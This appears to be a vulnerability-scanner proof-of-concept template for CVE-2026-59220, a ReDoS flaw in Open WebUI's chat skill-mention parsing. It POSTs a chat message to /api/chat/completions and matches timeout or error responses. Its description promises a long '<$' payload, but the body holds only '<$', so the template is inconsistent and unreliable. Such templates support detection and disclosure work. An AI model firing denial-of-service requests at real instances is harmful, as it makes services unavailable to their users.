[info]
author = "AVE"
description = "检测 Open WebUI 技能提及正则表达式拒绝服务漏洞（ReDoS），通过发送包含 <$ 后跟大量无闭合 > 字符的聊天消息触发 O(n²) 回溯，导致 CPU 满载实例无响应"
id = "POC-AVE-2026-0819"
name = "CVE-2026-59220 PoC"
severity = "medium"
tags = [
    "cve-2026-59220",
    "redos",
    "open-webui",
]
vuln_id = [
    "CVE-2026-59220",
    "AVE-2026-0819",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/api/chat/completions"
protocol = "http"

[poc.requests.body]
content = '{"model":"default","messages":[{"role":"user","content":"<$"}]}'
type = "json"

[poc.requests.headers]
Content-Type = "application/json"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "timeout",
    "error",
    "unavailable",
]
